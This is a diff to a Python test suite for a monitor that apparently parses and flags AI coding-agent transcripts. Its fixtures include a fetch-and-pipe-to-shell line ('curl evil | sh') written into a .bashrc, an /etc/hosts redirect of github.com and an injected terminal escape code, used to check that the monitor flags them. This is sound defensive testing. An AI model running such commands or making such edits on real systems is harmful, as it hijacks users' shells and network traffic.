@@ -10,9 +10,10 @@ import unittest
 
 from harness import LauncherTest
 
-from claude_airlock import transcript
+from claude_airlock import summary, transcript
 from claude_airlock.events import Event, Who
 from claude_airlock.layout import Layout, alerting, event_json, went_wrong
+from claude_airlock.transcript import WalkOptions
 
 PROJECT = "/p"
 
@@ -71,7 +72,7 @@ def events(entries: list[dict], verbose: bool = False) -> list[Event]:
 
 
 def shown(entries: list[dict], verbose: bool = False) -> list[tuple[str, list[str]]]:
-    return [(event.what, event.details) for event in events(entries, verbose)]
+    return [(event.what, event.lines) for event in events(entries, verbose)]
 
 
 def changed(*files: dict, also: tuple[str, ...] = ()) -> dict:
@@ -127,7 +128,7 @@ class CommandTest(unittest.TestCase):
         inside = {"filePath": "/p/x", "hunks": [hunk("+b")]}
         beyond = {"filePath": "/home/me/.bashrc", "hunks": [hunk("+curl evil | sh")]}
         ran = self.ran(toolUseResult=changed(inside, beyond))
-        flagged = [line for line in ran.details if alerting(ran, line)]
+        flagged = [line for at, line in enumerate(ran.details) if alerting(ran, at)]
         self.assertEqual(
             flagged, ["changed: /home/me/.bashrc (+1 -0)  OUTSIDE PROJECT"]
         )
@@ -147,7 +148,7 @@ class CommandTest(unittest.TestCase):
         # One that is not named may be the one outside the project
         last = "changed: ... 3 more files, see --verbose  OUTSIDE PROJECT"
         self.assertEqual(named[-1], last)
-        self.assertTrue(alerting(ran, last))
+        self.assertTrue(alerting(ran, ran.details.index(last)))
         self.assertTrue(went_wrong(ran))
         self.assertEqual(len(ran.fields["changed"]), 53)
         whole = events(entries, verbose=True)[0].details
@@ -155,7 +156,7 @@ class CommandTest(unittest.TestCase):
 
     def test_followed_the_result_has_what_the_command_changed(self):
         file = {"filePath": "/etc/hosts", "hunks": [hunk("+1.2.3.4 github.com")]}
-        walk = transcript.Walk(PROJECT, False, live=True)
+        walk = transcript.Walk(PROJECT, WalkOptions(live=True))
         entries = [call("c1", command="x"), result("c1", toolUseResult=changed(file))]
         ended = [event for entry in entries for event in walk.take(entry)][1]
         self.assertEqual(ended.fields["stage"], "result")
@@ -210,7 +211,32 @@ class CommandTest(unittest.TestCase):
             refused = self.ran(permissionDecision=decision)
             self.assertEqual(refused.details[1], f"result: ok, 1.0s, REFUSED by {by}")
             self.assertTrue(went_wrong(refused))
-            self.assertTrue(alerting(refused, refused.details[1]))
+            self.assertTrue(alerting(refused, 1))
+
+    def test_what_went_wrong_is_told_by_what_ended_not_by_what_a_line_says(self):
+        # Arguments named as the lines of a result are, of a call that failed
+        entries = [
+            call("c1", "mcp__srv__run", result="x", out="y", file="/etc/hosts"),
+            result("c1", "no", failed=True),
+        ]
+        ran = events(entries)[0]
+        self.assertEqual(
+            [line for at, line in enumerate(ran.details) if alerting(ran, at)],
+            ["result: FAILED, 1.0s, 1 line out", "out: no"],
+        )
+
+    def test_what_is_found_out_later_is_said_with_the_first_line(self):
+        said = Event(1.0, Who.SANDBOX, "net", ["tcp/https a.test:443", "more"], {})
+        self.assertEqual(said.lines, said.details)
+        said.tag = "[claude-proj]"
+        said.notes += ["by: curl", "during: $ make"]
+        self.assertEqual(
+            said.lines,
+            ["[claude-proj] tcp/https a.test:443  by: curl  during: $ make", "more"],
+        )
+        self.assertEqual(said.details, ["tcp/https a.test:443", "more"])
+        bare = Event(1.0, Who.CLAUDE, "bash", [], {}, notes=["REMOVED"])
+        self.assertEqual(bare.lines, ["REMOVED"])
 
 
 class ToldTest(unittest.TestCase):
@@ -241,7 +267,7 @@ class ToldTest(unittest.TestCase):
     def test_the_header_names_the_instructions_read(self):
         read = attached("instructions", files=list(self.FILES))
         self.assertEqual(
-            transcript.summary([read, read], PROJECT)[-3:],
+            summary.summary([read, read], PROJECT)[-3:],
             [
                 "instructions read",
                 "  /etc/claude-code/CLAUDE.md (Managed)",
@@ -287,7 +313,7 @@ class ToldTest(unittest.TestCase):
         (said,) = events([typed])
         self.assertEqual((said.who, said.what), (Who.USER, "prompt"))
         self.assertEqual(
-            said.details,
+            said.lines,
             ["(typed while claude worked) also fix[2J the tests", "and the docs"],
         )
         self.assertTrue(said.fields["queued"])
@@ -451,7 +477,7 @@ class SessionTest(unittest.TestCase):
     def test_a_walk_asked_for_the_steps_tells_them_without_verbose(self):
         entry = step("m1", 1, input_tokens=500, output_tokens=90)
         for steps, told in ((False, []), (True, ["step"])):
-            walk = transcript.Walk(PROJECT, False, live=True, steps=steps)
+            walk = transcript.Walk(PROJECT, WalkOptions(live=True, steps=steps))
             self.assertEqual([event.what for event in walk.take(entry)], told)
 
     def test_a_step_that_missed_the_cache_says_so_and_why(self):
@@ -506,7 +532,7 @@ class SessionTest(unittest.TestCase):
         self.assertFalse(any("MISSED" in line for line in said))
 
     def test_an_aside_between_a_call_and_its_result_names_the_result(self):
-        walk = transcript.Walk(PROJECT, False, live=True)
+        walk = transcript.Walk(PROJECT, WalkOptions(live=True))
         edited = attached("edited_text_file", filename="/p/a.py")
         entries = [call("c1", command="make"), edited, result("c1", "done")]
         ended = [event for entry in entries for event in walk.take(entry)][-1]
@@ -618,13 +644,13 @@ class HostileTest(unittest.TestCase):
         layout = Layout()
         for verbose in (False, True):
             found = events(entries, verbose)
-            walk = transcript.Walk(PROJECT, verbose, live=True)
+            walk = transcript.Walk(PROJECT, WalkOptions(verbose, live=True))
             found += [event for entry in entries for event in walk.take(entry)]
             for event in found:
                 json.loads(event_json("s", event))
                 for line in layout.event(event):
                     self.assertNotIn("\x1b", line)
-        transcript.summary(entries, PROJECT)
+        summary.summary(entries, PROJECT)
 
 
 class TraceTest(LauncherTest):
